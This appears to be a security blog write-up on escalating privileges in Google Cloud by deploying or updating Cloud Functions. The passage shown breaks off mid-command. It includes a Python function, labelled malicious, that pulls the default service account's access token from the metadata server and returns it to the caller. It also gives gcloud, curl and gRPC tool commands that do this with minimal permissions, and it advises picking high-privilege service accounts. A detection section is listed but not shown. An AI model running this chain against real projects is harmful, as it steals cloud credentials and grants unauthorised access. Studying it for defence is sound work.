# Privilege Escalation via Cloud Functions - Attack & Detection
- [Attack](#Attack)
  - [Phase I - Ways to Deploy a Cloud Function in Google Cloud Platform](#phase-i---ways-to-deploy-a-cloud-function-in-gcp)
    - [Ways to upload code in Cloud Function](#ways-to-upload-code-in-cloud-function-in-gcp)
    - [APIs and Permissions Required for Deploying a Cloud Function via gCloud](#apis-and-permissions-required-for-deploying-a-cloud-function-via-gcloud)
      - [Deploying a Cloud Function via gCloud](#deploying-a-cloud-function-via-gcloud) 
    - [APIs and Permissions Required for Deploying a Cloud Function via  Cloud Function API (gRPC & REST)](#apis-and-permissions-required-for-deploying-a-cloud-function-via-cloud-function-api-grpc--rest)
      - [Deploying a Cloud Function via Cloud Function API (gRPC)](#deploying-a-cloud-function-via-cloud-function-api-grpc)
      - [Deploying a Cloud Function via Cloud Function API (REST)](#deploying-a-cloud-function-via-cloud-function-api-rest)
  - [Phase I.I - Ways to Update a Cloud Function in Google Cloud Platform](#phase-ii---ways-to-update-a-cloud-function-in-google-cloud-platform)
    - [Ways to update code in Cloud Function](#ways-to-update-code-in-cloud-function-in-gcp)
    - [APIs and Permissions Required for Listing Cloud Functions via gCloud and Cloud Function API (gRPC & REST)](#apis-and-permissions-required-for-listing-cloud-function-information-via-gcloud-and-cloud-function-api-grpc--rest)
      - [Listing Cloud Function Information via gCloud and Cloud Function API (gRPC & REST)](#listing-cloud-function-information-via-gcloud-and-cloud-function-api-grpc--rest) 
    - [APIs and Permissions Required for Updating a Cloud Function via gCloud](#apis-and-permissions-required-for-updating-a-cloud-function-via-gcloud)
      - [Updating a Cloud Function via gCloud](#updating-a-cloud-function-via-gcloud) 
    - [APIs and Permissions Required for Updating a Cloud Function via Cloud Function API (gRPC & REST)](#apis-and-permissions-required-for-updating-a-cloud-function-via-cloud-function-api-grpc--rest)
      - [Updating a Cloud Function via Cloud Function API (gRPC)](#updating-a-cloud-function-via-cloud-function-api-grpc)
      - [Updating a Cloud Function via Cloud Function API (REST)](#updating-a-cloud-function-via-cloud-function-api-rest)
  - [Phase II - Ways to Set IAM Policy Binding to a Cloud Function in Google Cloud Platform](#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform)
    - [APIs and Permissions Required to Set IAM Policy Binding to a Cloud Function via gCloud & Cloud Function API (gRPC & REST)](#apis-and-permissions-required-to-set-iam-policy-binding-to-a-cloud-function-via-gcloud--cloud-function-api-grpc--rest)
      - [Setting IAM Policy Binding to the Cloud Function via gCloud](#setting-iam-policy-binding-to-the-cloud-function-via-gcloud)
      - [Setting IAM Policy Binding to the Cloud Function via Cloud Function API (REST)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-rest)
      - [Setting IAM Policy Binding to the Cloud Function  via Cloud Function API (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc)
    - [Invoking the Cloud Function](#invoking-the-cloud-function)
  - [Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform](#phase-iii---privilege-escalation-via-cloud-function-in-google-cloud-platform)
    - [Deploying the Cloud Function via Cloud Function API (gRPC)](#deploying-the-cloud-function-via-cloud-function-api-grpc)
    - [Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc-1)
    - [Escalating Privilege to a high level Service Account](#escalating-privilege-to-a-high-level-service-account)
- [Detect](#Detect)
  - [Manual Source Code Review (Inefficient)](#manual-source-code-review-inefficient)
- [References and Resources](#references-and-resources)

# Attack

## Phase I - Ways to Deploy a Cloud Function in GCP

There are three ways to deploy a Cloud Function in GCP: 

1. Cloud Console
2. gCloud Command
3. Cloud Function API (REST & gRPC)

#### Reason to not use Cloud Console:
While Cloud Console may seem user-friendly for creating resources in GCP, we won't be using it. The reason being, creating resources in GCP often involves navigating through different pages, each with its own set of permissions. Depending on the user's level of access, they may not be able to view or access certain pages necessary to create a particular resource. It's important to have a number of permissions in place to ensure that a user can perform the actions they need to within the GCP environment. 

While in case of gCloud or Cloud Function API a user for example, can create a Cloud Function with a narrow set of permissions, which is not possible in case of Cloud Console. Cloud Function API narrows down the permissions even more, and that is a great thing. (See [APIs and Permissions Required for Deploying a Cloud Function via Cloud Function API (gRPC & REST)](#apis-and-permissions-required-for-deploying-a-cloud-function-via-cloud-function-api-grpc--rest) for more details)

Attackers mainly gain access to a GCP environment using stolen or compromised authentication tokens (auth_tokens) or Service Account Keys. Cloud Console doesn't support authentication via auth_tokens neither Service Account Key. As a result, attackers may prefer to use the gCloud command or directly call the Cloud Function API via gRPC or REST API to create resources because they offer more flexibility in terms of authentication and control, and require narrow set of permissions.

### Ways to upload code in Cloud Function in GCP

If you're creating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. 

The code uploaded to a cloud function helps define the behavior and functionality of the function. Code can include the logic for processing incoming requests, performing specific tasks, accessing external resources, and returning responses etc. The code is responsible for executing the main function that is triggered when the function is invoked, and it can interact with various services and APIs based on the needs of the function. The Code allows the function to perform a specific action or set of actions in response to an event or request. In short the code is what makes a Cloud Function - "Function". 

There are three different ways to upload the code:

1. Local Machine
2. Cloud Storage
3. Cloud Repository

<p><img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/7.jpg"></p>

In our case, since we are using Cloud Function to Privilege Escalate, we will upload a malicious code to the Cloud Function. Here is the code we will be uploading.

```python
import requests

def anirban(request):
    metadata_server_url = "http://169.254.169.254/computeMetadata/v1"
    metadata_key_url = f"{metadata_server_url}/instance/service-accounts/default/token"
    metadata_headers = {"Metadata-Flavor": "Google"}
    response = requests.get(metadata_key_url, headers=metadata_headers)
    access_token = response.text
    return access_token
```

This above function retrieves the access token of the default Service Account of the current cloud function instance. It does so by sending a GET request to the Compute Engine metadata server endpoint at "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token". The metadata server endpoint returns a JSON response containing the access token. The function then returns the access token to the caller.

>Note: The metadata server is an internal server within the GCP infrastructure. It is used by VMs running on Google Compute Engine and other GCP services to access instance-specific metadata, such as instance attributes, network configurations, and authentication tokens for Google Cloud APIs. The Metadata server can be accessed only internally on the hostname metadata.google.internal (169.254.169.254). It is not accessible from the public internet.

### APIs and Permissions Required for Deploying a Cloud Function via gCloud

Let's start with the first step of deploying/creating a Cloud Function. But before that, in GCP there are two steps to perform an action on a service.

1. Before you interact with a particular service, the corresponding API must be enabled for your project. 
2. Then, you need to have the required permissions or roles associated with your account to perform specific actions.

**List of APIs that needs to be enabled to "Deploy a Cloud Function via gCloud"**
<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
  <tr>
    <td>cloudresourcemanager.googleapis.com (Cloud Resource Manager API)</td>
  </tr>
</table>

Command to enable APIs via gCloud:

```powershell
gcloud services list
gcloud services enable cloudbuild.googleapis.com
```
For every action in GCP you'd require permissions, and it is same for above commands as well.

Permissions needed to list enabled APIs
- serviceusage.services.list

Permissions needed to enable APIs
- serviceusage.services.enable

You might encounter an error that reads: *Service Usage API has not been used in project <project-number> before or it is disabled*, this means you need to enable the Service Usage API for your project. Although the Service Usage API is enabled by default in most cases, it may be disabled in some scenarios. If Service Usage API is disabled, you'd need project-level permissions, such as roles/owner or roles/editor etc, to enable it. It's confusing so here's an image that explains it better.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/46.jpg">
</p>

When you enable a specific API, it might automatically enable other APIs that the primary API depends on for its functionality. These are called "Dependent APIs."

Dependent API of:
- cloudfunctions.googleapis.com (Cloud Functions API):
  - logging.googleapis.com (Cloud Logging API)
  - pubsub.googleapis.com (Cloud Pub/Sub API)
  - source.googleapis.com (Legacy Cloud Source Repositories API)
  - storage-api.googleapis.com (Google Cloud Storage JSON API)
  - storage-component.googleapis.com (Cloud Storage)

- cloudbuild.googleapis.com (Cloud Build API)
  - containerregistry.googleapis.com (Container Registry API)
  - logging.googleapis.com (Cloud Logging API)
  - pubsub.googleapis.com (Cloud Pub/Sub API)
  - storage-api.googleapis.com (Google Cloud Storage JSON API)

> Note:
> 1. Make sure the above APIs (cloudfunctions.googleapis.com, cloudbuild.googleapis.com, cloudresourcemanager.googleapis.com) are enabled for you to successfully deploy, update and Bind IAM Policy to a Cloud Function via gCloud. 
> 2. Doesn't matter if you're deploying a Cloud Function from your local machine or from Cloud Storage or Cloud Repository, you need to enable the above three APIs.

**List of permissions that's required to "Deploy a Cloud Function via gCloud"**

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Deploy via gCloud</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage (Different Project)</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository
(Different Project)</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

#### Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/8b.jpg">
</p>

### Deploying a Cloud Function via gCloud

<table>
  <tr>
   <td colspan="3" align="center"><strong>Command to Deploy Cloud Function via gCloud</strong></td>
  </tr>
  <tr>
   <td><strong>Source Code Upload via: Local Machine</strong></td>
   <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=. --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
   </tr>
   
<tr>
  <td><strong>Source Code Upload via: Cloud Storage</strong></td>
   <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
  <tr>
 <td><strong>Source Code Upload via: Cloud Repository</strong></td>
 <td>gcloud functions deploy &lt;function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
</table>

>Note: You might encounter an Error: "*ERROR: (gcloud.functions.deploy) ResponseError: status=[403], code=[Ok], message=[Permission 'cloudfunctions.operations.get' denied on resource 'operations/bzQ2MjAvdXMtY2VudHJhbDEvZXhmaWwxL18yTjJSYkp6alBB' (or resource may not exist).]*". Don't worry about it, the Cloud Function will be created regardless without any errors.  

Here's the deployment of cloud function via gCloud deploy command in action

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/18.png">
</p>

Every permission mentioned in the [image](#heres-an-image-to-understand-it-better) seems to do something which is quite clear from their name. But here's something I found really strange, why is there a need for  `cloudfunctions.functions.get` permission for creating a Cloud Function? As far as the documentation goes the description for the permission `cloudfunctions.functions.get` says view functions. ([Link](https://cloud.google.com/functions/docs/reference/iam/permissions))

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/1.JPG">
</p>

Which means `cloudfunctions.functions.get` permission allows a user or service account to view metadata about a Cloud Function, such as its name, runtime, entry point, trigger settings, and other configuration details. What I guess is, it may be a default behavior of gCloud to include this permission when creating a function but it is not necessary for the creation of the function.

Using tools like gCloud can be convenient, but sometimes gCloud requires additional permissions beyond what is actually needed for the task at hand as you saw above. This can result in unnecessarily permission requirements for users. 

When a command is executed, gCloud translates the command into an API request and sends it to respective APIs (Cloud Function API, Compute Engine API etc). The API then processes the request, creates or updates the respective resource, and sends back a response, which gcloud displays in your terminal.

One way to narrow down the permission requirements is to not rely on tools like gCloud to communicate with the APIs at all, but to communicate with the APIs ourselves. 
APIs can be called via gRPC and REST APIs and can make the process much more precise and efficient in terms of permissions to create resources like Cloud Functions, Compute Engine etc. gRPC and REST API allows us to specify only the necessary permissions for the specific task, not more or less.

Let's see how we can do it.

### APIs and Permissions Required for Deploying a Cloud Function via Cloud Function API (gRPC & REST)

**List of APIs that needs to be enabled to "Deploy a Cloud Function via Cloud Function API (gRPC & REST)"**

<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
</table>

**List of permissions that's required to "Deploy a Cloud Function via Cloud Function API (gRPC & REST)"**

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Deploy via Cloud Function API (gRPC & REST)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
   <td>cloudfunctions.functions.create
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/9b.jpg">
</p>
  
>Note: You might need additional permissions to successfully upload code from the two sources: Local Machine and Cloud Repository via Cloud Function API (gRPC & REST).  However, for the Source: Cloud Storage, the permissions listed are the least that's required. Since it's easier to do it via Cloud Storage, why even bother with the other two? :)

Notice how when we use Cloud Function API we don't need any additional permissions (in our case: cloudfunctions.functions.get). We only need the permissions that required for the task. While in case of gCloud we need to have the additional permission (in our case: cloudfunctions.functions.get), although they were not required.

If you take a look at the image below, it's clear that of the two methods for deploying a Cloud Function (gCloud and Cloud Function API), Cloud Function API's path requires the least amount of permissions and can easily be chosen over any other method. This is another reason why attackers would tend to use this method rather than relying on gCloud.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/19.1b.jpg">
</p>

Let's call the Cloud Function API using both gRPC and REST to deploy a Cloud Function (Code Upload Source: Cloud Storage). 

### Deploying a Cloud Function via Cloud Function API (gRPC)

gRPC is an open-source Remote Procedure Call (RPC) framework developed by Google. Won't go into much details of gRPC and step straight into the point.

Here's a little tool [gLess](https://github.com/anrbn/gLess) that uses gRPC to communicate with the Cloud Function API and perform various tasks on Cloud Functions such as deployment, updation, setting IAM Binding etc all while using the lowest permissions possible.

We will be utilizing this [gLess](https://github.com/anrbn/gLess) to accomplish all related tasks pertaining to Cloud Function and gRPC all through this blog. Before we deploy the function, let's check the permission the user holds first.

```powershell
py.exe .\main.py --project-id <project-id> --checkperm
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/20.1.png">
</p>

We only have two permissions ( `iam.serviceAccounts.actAs` & `cloudfunctions.functions.create` ) as you can see above, that's enough for us to deploy a Cloud Function. For every action [gLess](https://github.com/anrbn/gLess) communicates to Cloud Function API via gRPC (not REST). For uploading the Source Code to the Cloud Function, Cloud Storage is being used as it takes the least permission.

Next, we will deploy the function. 
```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --deploy
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/22.png">
</p>

Even though a warning pops up that "*Permission cloudfunctions.operations.get denied*" the Cloud Function will be successfully created. The warning is likely due to some internal operations being performed by the Cloud Function service during the creation process.  

### Deploying a Cloud Function via Cloud Function API (REST)

Here's another way to call the Cloud Function API using REST. Below is a curl command which makes an HTTP POST request to the Google Cloud Functions API to create a new Cloud Function using required parameters. 

```shell
curl -X POST \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name":"projects/<project-id>/locations/<region>/functions/<function-name>","entryPoint":"<function-entrypoint>","runtime":"python38","serviceAccountEmail":"<service-account-email>","sourceArchiveUrl":"<gs-link-to-zipped-sourcecode>","httpsTrigger":{}}' \
  https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json

```
Here's the one liner which can run in `cmd` without any errors.

```shell
curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" -d "{\"name\":\"projects/<project-id>/locations/<region>/functions/<function-name>\",\"entryPoint\":\"<function-entrypoint>\",\"runtime\":\"python38\",\"serviceAccountEmail\":\"<service-account-email>\",\"sourceArchiveUrl\":\"<gs-link-to-zipped-sourcecode>\",\"httpsTrigger\":{}}" https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions?alt=json
```

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/23.png">
</p>

Modify the parameters according to your need.

<table>
  <tr>
   <td>&lt;token> 
   </td>
   <td>&lt;token> is a placeholder for an actual authorization token that is required to authenticate and authorize the API request. Run the command 
"**gcloud auth application-default print-access-token**" to get the token.
   </td>
  </tr>
  <tr>
   <td>&lt;project-id>
   </td>
   <td>The ID of the Google Cloud project in which the Cloud Function will be created.
   </td>
  </tr>
  <tr>
   <td>&lt;region>
   </td>
   <td>The region where the Cloud Function will be deployed. For example, "us-central1".
   </td>
  </tr>
  <tr>
   <td>&lt;function-name>
   </td>
   <td>The name of the Cloud Function being created.
   </td>
  </tr>
  <tr>
   <td>&lt;function-entrypoint>
   </td>
   <td>The name of the entry point function for the Cloud Function. This is the function that will be executed when the Cloud Function is triggered.
   </td>
  </tr>
  <tr>
   <td>&lt;service-account-email>
   </td>
   <td>The email address of the service account that will be used to run the Cloud Function. Choosing a Service Account with high privileges will help you Privilege Escalate easier.
   </td>
  </tr>
  <tr>
   <td>&lt;gs-link-to-zipped-sourcecode>
   </td>
   <td>The URL of the Cloud Storage archive file that contains the source code for the Cloud Function. The archive file must be in ZIP format. Example: gs://bucket-name/code.zip
   </td>
  </tr>
</table>

However, invoking the function will lead to the following error: *Your client does not have permission to get URL.* 
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/24.png">
</p>

Go over to [Phase II](#phase-ii---ways-to-set-iam-policy-binding-to-a-cloud-function-in-google-cloud-platform) to know how to overcome this issue.

## Phase I.I - Ways to Update a Cloud Function in Google Cloud Platform

> You might notice lots of similarities between Phase I and Phase I.I. Because function deployment and updation are technically similar, both need almost similar permissions, Thus I've described them in the same manner. Attackers would either choose to Deploy or Update an already existing Cloud Function. Thus this phase is not Phase II but rather Phase I.I.

There are three ways to update a Cloud Function in GCP: 
1. Cloud Console
2. gCloud Command
3. Cloud Function API (REST & gRPC)

For Obvious reasons (discussed in Phase I) we won't be using Cloud Console for any task. ([Reason](#reason-to-not-use-cloud-console))

### Ways to update code in Cloud Function in GCP

If you're updating a Cloud Function in GCP, you can use **Cloud Console, gCloud Command, **or** Cloud Function API** to do so. Regardless of the method you choose, you will need to upload the code into the Cloud Function. There are three different ways to upload the code:

1. Local Machine
2. Cloud Storage
3. Cloud Repository

<p><img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/31.jpg"></p>

### APIs and Permissions Required for Listing Cloud Function Information via gCloud and Cloud Function API (gRPC & REST)

**List of APIs that needs to be enabled to "List Cloud Functions via gCloud"**

<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
  <tr>
    <td>cloudresourcemanager.googleapis.com (Cloud Resource Manager API)</td>
  </tr>
</table>

**List of APIs that needs to be enabled to "List Cloud Functions via Cloud Function API (gRPC & REST)"**

<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
</table>

**List of permissions that's required to "List Cloud Functions via gCloud and Cloud Function API (gRPC & REST)"**

<table>
  <tr>
   <td colspan="3" align="center"><strong>Listing Cloud Function Details</strong>
   </td>
  </tr>
  <tr>
   <td><strong>via gCloud</strong>
   </td>
   <td><strong>via Cloud Function API (gRPC & REST)</strong>
   </td>

  </tr>
  <tr>
   <td>cloudfunctions.functions.list
   </td>
   <td>cloudfunctions.functions.list
   </td>

  </tr>
  <tr>
   <td>cloudfunctions.locations.list
   </td>
   <td>
   </td>
  </tr>
</table>

Listing the functions is optional, you would not need the above permissions if you already know the functions name and region via different ways like a function having a public endpoint which gives off the function name etc.

### Listing Cloud Function Information via gCloud and Cloud Function API (gRPC & REST)

Listing Cloud Function Information via gCloud 

```powershell
gcloud functions list
```

For listing Cloud Function Information via Cloud Function API (gRPC), we'll be using [gLess](https://github.com/anrbn/gLess) 

```powershell
py.exe .\main.py --project-id <project-id> --list
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/34.1.png">
</p>

Listing Cloud Function Information via Cloud Function API (REST)
```shell
curl -X GET \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/-/functions"
```
One Liner:
```shell
curl -s -H "Authorization: Bearer <token>" -H "Content-Type: application/json" "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/-/functions"
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/35.png">
</p>

### APIs and Permissions Required for Updating a Cloud Function via gCloud

**List of APIs that needs to be enabled to "Update Cloud Functions via gCloud"**

<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
  <tr>
    <td>cloudresourcemanager.googleapis.com (Cloud Resource Manager API)</td>
  </tr>
</table>

**List of permissions that's required to "Update a Cloud Function via gCloud"**

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Update via gCloud</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage (Different Project)</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository
(Different Project)</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.update
   </td>
   <td>cloudfunctions.functions.update
   </td>
   <td>cloudfunctions.functions.update
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
   <td>cloudfunctions.functions.get
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/32.1b.jpg">
</p>

>Note: If a function already exists then in most cases you won't need to set any IAM Policy Binding to the Cloud Function. Chances are they are already invokable by authenticated or non-authenticated principals. The Function could be public which means anyone can access the function. But in some cases the function could be private which means only a certain user, group or service account has access to the function. In that case you'd need to update the IAM Policy Binding to the Cloud Function.  It is the same command for Setting and Updating the IAM Policy Binding.

### Updating a Cloud Function via gCloud

<table>
  <tr>
   <td colspan="3" align="center"><strong>Command to Update Cloud Function via gCloud</strong></td>
  </tr>
  <tr>
   <td><strong>Source Code Upload via: Local Machine</strong></td>
   <td>gcloud functions deploy &lt;old-function-name> --runtime=python38 --source=. --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
   </tr>
   
<tr>
  <td><strong>Source Code Upload via: Cloud Storage</strong></td>
   <td>gcloud functions deploy &lt;old-function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
  <tr>
 <td><strong>Source Code Upload via: Cloud Repository</strong></td>
 <td>gcloud functions deploy &lt;old-function-name> --runtime=python38 --source=&lt;gs-link-to-zipped-sourcecode> --entry-point=&lt;function-entrypoint> --trigger-http --service-account=&lt;service-account-email></td>
 </tr>
</table>

>Note: In case you're wondering why "deploy" argument is being used to update a Cloud Function, it's because there is no update command that updates a Cloud Function. Updation is done via "deploy" argument. Update happens when the function name and region is the same and the user running the command has `cloudfunctions.function.update` permission.   

### APIs and Permissions Required for Updating a Cloud Function via Cloud Function API (gRPC & REST)

**List of APIs that needs to be enabled to "Update Cloud Functions via Cloud Function API (gRPC & REST)"**

<table>
  <tr>
    <td>cloudfunctions.googleapis.com (Cloud Functions API)</td>
  </tr>
  <tr>
    <td>cloudbuild.googleapis.com (Cloud Build API)</td>
  </tr>
</table>

**List of permissions that's required to "Update a Cloud Function via Cloud Function API (gRPC & REST)"**

<table>
  <tr>
   <td colspan="3" align="center"><strong>Cloud Function Update via Cloud Function API (gRPC & REST)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Function Code Upload Source: Local Machine</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Storage</strong>
   </td>
   <td><strong>Function Code Upload Source: Cloud Repository</strong>
   </td>
  </tr>
  <tr>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
   <td>iam.serviceAccounts.actAs
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.update
   </td>
   <td>cloudfunctions.functions.update
   </td>
   <td>cloudfunctions.functions.update
   </td>
  </tr>
  <tr>
   <td>cloudfunctions.functions.sourceCodeSet
   </td>
   <td>
   </td>
   <td>source.repos.get (Google Cloud Functions Service Agent)
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
   <td>source.repos.list (Google Cloud Functions Service Agent)
   </td>
  </tr>
</table>

Here's an image to understand it better.

<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/33b.jpg">
</p>

Let's call the Cloud Function API using both gRPC and REST to update a Cloud Function (Code Upload Source: Cloud Storage). 

### Updating a Cloud Function via Cloud Function API (gRPC)

Let's use [gLess](https://github.com/anrbn/gLess) to update a Cloud Function. But first let's confirm we have the permission to update a Cloud Function as well as list their information.

```powershell
py.exe .\main.py --project-id <project-id> --checkperm
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/36.png">
</p>

We do have the `cloudfunctions.functions.update` & `iam.serviceAccounts.actAs` permission which is enough to update a Cloud Function. However, we have `cloudfunctions.functions.list` permission as well which means we can list Cloud Functions information. Let's do that first.

Listing Cloud Functions Information.
```powershell
py.exe .\main.py --project-id <project-id> --list
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/37.png">
</p>
Next, we will choose a function to update, I'll be going with "function-1". 

```powershell
py.exe .\main.py --project-id <project-id> --location <region> --function-name <function-name> --gsutil-uri <gsutil-uri> --function-entry-point <entry-point> --service-account <sa-account> --update
```
<p>
  <img src="https://github.com/anrbn/GCP-Attack-Defense/blob/main/images/CloudFunction/PrivEsc-via-CloudFunction/38.png">
</p>
Cloud Function has been successfully updated.

### Updating a Cloud Function via Cloud Function API (REST)

Another way to update the Cloud Function is obviously using the REST API. Below is a curl command which makes an HTTP POST request to the Google Cloud Functions API to update an available Cloud Function. 

If you want to update a single parameter (In this case: serviceAccountEmail) in the Cloud Function use the following command: 
```shell
curl -X PATCH \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
        "serviceAccountEmail": "<service-account-email>",
      }' \
  "https://cloudfunctions.googleapis.com/v1/projects/<project-id>/locations/<region>/functions/<function-name>?updateMask=serviceAccountEmail"
```
However, if you want to update multiple parameters (In this case: entryPoint,runtime,serviceAccountEmail,sourceArchiveUrl) in the Cloud Function use the following command:
```shell
curl -X PATCH \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
        "entryPoint": "<function-entrypoint>",
        "runtime": "python38",
